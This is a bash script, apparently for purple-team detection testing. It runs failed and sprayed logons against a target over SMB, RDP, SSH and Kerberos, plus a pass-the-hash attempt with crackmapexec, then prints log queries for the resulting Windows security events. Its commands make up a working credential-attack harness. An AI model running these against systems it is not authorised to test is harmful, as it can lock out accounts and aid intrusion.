#!/bin/bash
#
# Credential Attack Testing Script
# Tests password spraying and brute force detection
#
# Triggers:
# - Event 4625: Failed Logon
# - Event 4740: Account Lockout
# - Event 4776: Credential Validation
# - Event 4771: Kerberos Pre-Auth Failed
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
TARGET=""
LOG_FILE="/tmp/credential-attacks-$(date +%Y%m%d_%H%M%S).log"
DELAY=2
SAFE_MODE=true

log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $1"
    echo -e "$msg" | tee -a "$LOG_FILE"
}

banner() {
    echo -e "${CYAN}"
    echo "============================================================"
    echo "  Credential Attack Detection Test"
    echo "============================================================"
    echo -e "${NC}"
}

usage() {
    echo "Usage: $0 -t <target_ip> [--unsafe]"
    echo ""
    echo "Options:"
    echo "  -t        Target IP address"
    echo "  --unsafe  Run actual brute force (DANGEROUS)"
    echo ""
    echo "By default, runs in SAFE mode (limited attempts)"
    exit 1
}

check_tools() {
    local tools=("hydra" "crackmapexec" "smbclient" "medusa")
    local missing=()

    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[WARN] Missing tools: ${missing[*]}${NC}"
    fi
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t) TARGET="$2"; shift 2 ;;
        --unsafe) SAFE_MODE=false; shift ;;
        -h|--help) usage ;;
        *) usage ;;
    esac
done

if [ -z "$TARGET" ]; then
    usage
fi

banner

if [ "$SAFE_MODE" = true ]; then
    echo -e "${GREEN}Running in SAFE mode (limited attempts)${NC}"
else
    echo -e "${RED}Running in UNSAFE mode (full brute force)${NC}"
fi
echo ""

echo -e "${YELLOW}"
echo "WARNING: This script performs credential attacks."
echo "This WILL generate failed logon events!"
echo "Accounts MAY get locked out!"
echo "Only use in authorized test environments!"
echo -e "${NC}"
echo ""
read -p "Continue? (y/n): " confirm
if [ "$confirm" != "y" ]; then
    echo "Cancelled by user"
    exit 0
fi

log "${CYAN}Starting Credential Attack Tests${NC}"
log "Target: $TARGET"
log "Safe Mode: $SAFE_MODE"
log "Log file: $LOG_FILE"
echo ""

check_tools

# Test usernames and passwords for simulation
TEST_USERS=("administrator" "admin" "user" "test" "guest")
TEST_PASSWORDS=("password" "Password1" "123456" "admin" "")

# =============================================================================
# Test 1: SMB Authentication Attempts
# =============================================================================
echo -e "${GREEN}[TEST 1] SMB Failed Authentication${NC}"
log "[TEST 1] SMB Authentication Attempts"

if command -v smbclient &> /dev/null; then
    for user in "${TEST_USERS[@]}"; do
        log "Attempting: $user @ $TARGET (SMB)"
        smbclient -U "$user%wrongpassword" -L "//$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
        sleep 1
    done
fi

sleep "$DELAY"

# =============================================================================
# Test 2: RDP Authentication Attempts
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 2] RDP Failed Authentication${NC}"
log "[TEST 2] RDP Authentication Attempts"

if command -v hydra &> /dev/null; then
    if [ "$SAFE_MODE" = true ]; then
        # Single attempt per user (safe)
        for user in "${TEST_USERS[@]:0:3}"; do
            log "Attempting: $user @ $TARGET:3389 (RDP)"
            timeout 10 hydra -l "$user" -p "wrongpassword" -t 1 rdp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
            sleep 1
        done
    else
        log "Running: hydra -L users.txt -P passwords.txt rdp://$TARGET"
        echo -e "${YELLOW}Full brute force would run here${NC}"
    fi
else
    log "hydra not available, using xfreerdp"
    if command -v xfreerdp &> /dev/null; then
        for user in "${TEST_USERS[@]:0:2}"; do
            log "Attempting: $user @ $TARGET (RDP)"
            timeout 5 xfreerdp /v:"$TARGET" /u:"$user" /p:"wrongpassword" /cert:ignore 2>&1 | tee -a "$LOG_FILE" || true
            sleep 1
        done
    fi
fi

sleep "$DELAY"

# =============================================================================
# Test 3: SSH Authentication Attempts
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 3] SSH Failed Authentication${NC}"
log "[TEST 3] SSH Authentication Attempts"

if command -v ssh &> /dev/null; then
    for user in "${TEST_USERS[@]:0:3}"; do
        log "Attempting: $user @ $TARGET:22 (SSH)"
        timeout 5 sshpass -p "wrongpassword" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$user@$TARGET" exit 2>&1 | tee -a "$LOG_FILE" || true
        sleep 1
    done
fi

sleep "$DELAY"

# =============================================================================
# Test 4: Password Spraying Simulation
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 4] Password Spraying (Single Password)${NC}"
log "[TEST 4] Password Spraying"

SPRAY_PASSWORD="Spring2024!"

if command -v crackmapexec &> /dev/null; then
    log "Running: crackmapexec smb $TARGET -u users -p $SPRAY_PASSWORD"
    # Create temp user list
    printf '%s\n' "${TEST_USERS[@]}" > /tmp/spray_users.txt
    crackmapexec smb "$TARGET" -u /tmp/spray_users.txt -p "$SPRAY_PASSWORD" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/spray_users.txt
elif command -v netexec &> /dev/null; then
    printf '%s\n' "${TEST_USERS[@]}" > /tmp/spray_users.txt
    netexec smb "$TARGET" -u /tmp/spray_users.txt -p "$SPRAY_PASSWORD" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/spray_users.txt
else
    log "crackmapexec/netexec not available"
fi

sleep "$DELAY"

# =============================================================================
# Test 5: Kerberos Pre-Auth Attempts
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 5] Kerberos Pre-Authentication${NC}"
log "[TEST 5] Kerberos Pre-Auth"

if command -v kinit &> /dev/null; then
    for user in "${TEST_USERS[@]:0:3}"; do
        log "Attempting: $user Kerberos auth"
        echo "wrongpassword" | timeout 5 kinit "$user@$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
        sleep 1
    done
else
    log "kinit not available"
fi

sleep "$DELAY"

# =============================================================================
# Test 6: NTLM Hash Attempts (simulated)
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 6] NTLM Authentication (Pass-the-Hash simulation)${NC}"
log "[TEST 6] NTLM/PTH Simulation"

# Fake NTLM hash for testing
FAKE_HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

if command -v crackmapexec &> /dev/null; then
    log "Running: crackmapexec smb $TARGET -u administrator -H [FAKE_HASH]"
    crackmapexec smb "$TARGET" -u "administrator" -H "$FAKE_HASH" 2>&1 | tee -a "$LOG_FILE" || true
elif command -v netexec &> /dev/null; then
    netexec smb "$TARGET" -u "administrator" -H "$FAKE_HASH" 2>&1 | tee -a "$LOG_FILE" || true
fi

sleep "$DELAY"

# =============================================================================
# Test 7: Rapid-Fire Attempts (triggers lockout detection)
# =============================================================================
echo ""
echo -e "${GREEN}[TEST 7] Rapid Authentication Attempts${NC}"
log "[TEST 7] Rapid-Fire Attempts"

echo -e "${YELLOW}Generating 10 rapid failed authentications...${NC}"

if command -v smbclient &> /dev/null; then
    for i in $(seq 1 10); do
        smbclient -U "testuser$i%wrongpass" -L "//$TARGET" 2>&1 | tee -a "$LOG_FILE" &
    done
    wait
    log "Rapid attempts completed"
fi

# =============================================================================
# Summary
# =============================================================================
echo ""
echo -e "${CYAN}============================================================${NC}"
echo -e "${GREEN}  Credential Attack Tests Complete!${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""

log "Tests completed at $(date)"
echo ""
echo -e "${YELLOW}Detection Verification:${NC}"
echo ""
echo "1. Failed Logon Events (4625):"
echo "   {job=\"windows_auth\"} |= \"4625\""
echo ""
echo "2. Account Lockout (4740):"
echo "   {job=\"windows_auth\"} |= \"4740\""
echo ""
echo "3. Credential Validation (4776):"
echo "   {job=\"windows_auth\"} |= \"4776\""
echo ""
echo "4. Kerberos Pre-Auth Failed (4771):"
echo "   {job=\"windows_auth\"} |= \"4771\""
echo ""
echo "5. Count by source IP:"
echo "   sum by (src_ip) (count_over_time({job=\"windows_auth\"} |= \"4625\" [5m]))"
echo ""
echo "Log saved to: $LOG_FILE"
